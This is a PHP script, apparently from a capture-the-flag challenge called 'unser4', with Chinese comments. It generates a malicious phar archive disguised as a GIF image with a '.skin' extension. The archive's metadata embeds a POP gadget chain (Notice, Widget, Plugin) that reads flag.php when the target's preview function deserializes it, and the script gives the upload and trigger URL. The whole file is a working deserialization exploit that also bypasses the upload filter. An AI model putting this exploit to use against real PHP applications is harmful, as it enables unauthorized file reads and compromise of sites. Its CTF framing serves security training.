<?php
// ============================================================
// unser4 · 恶意 phar（皮肤包）生成器（离线工具）
// 用法：php -d phar.readonly=0 gen_phar.php
// 产物：evil.skin（GIF89a 头 + phar 存档，metadata 里埋着 Notice POP 链）
// 上传后在题目页「导入预览」打开它（getMetadata 触发反序列化）
// ============================================================
if (ini_get('phar.readonly')) {
    fwrite(STDERR, "请用 php -d phar.readonly=0 运行本脚本\n");
    exit(1);
}
require __DIR__ . '/classes.php';

$plugin = new Plugin();
$plugin->hook = ['template' => 'flag.php'];   // __get('template') → file_get_contents('flag.php')

$widget = new Widget();
$widget->plugin = $plugin;                    // __toString → 访问 plugin->template → __get

$notice = new Notice();
$notice->msg = $widget;                       // __destruct 拼接 → __toString

$out = __DIR__ . '/evil.skin';
$tmp = __DIR__ . '/evil_build.phar';
@unlink($out);
@unlink($tmp);
$phar = new Phar($tmp);                       // Phar 构造要求 .phar 后缀，先建再改名
$phar->startBuffering();
$phar->addFromString('x.txt', 'placeholder'); // 任意内部条目（预览读取存档需要）
$phar->setMetadata($notice);                  // ← 元数据 = 恶意对象（getMetadata 反序列化的入口）
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");  // GIF 伪装头（stub 前可加任意内容）
$phar->stopBuffering();
copy($tmp, $out);                             // phar 靠内容识别，后缀无所谓（业务叫 .skin）
unlink($tmp);

echo "已生成 {$out}（", filesize($out), " 字节）\n";
echo "上传后在题目页点击 uploads/ 列表里的该文件预览（或 ?action=preview&name=<保存名>）\n";
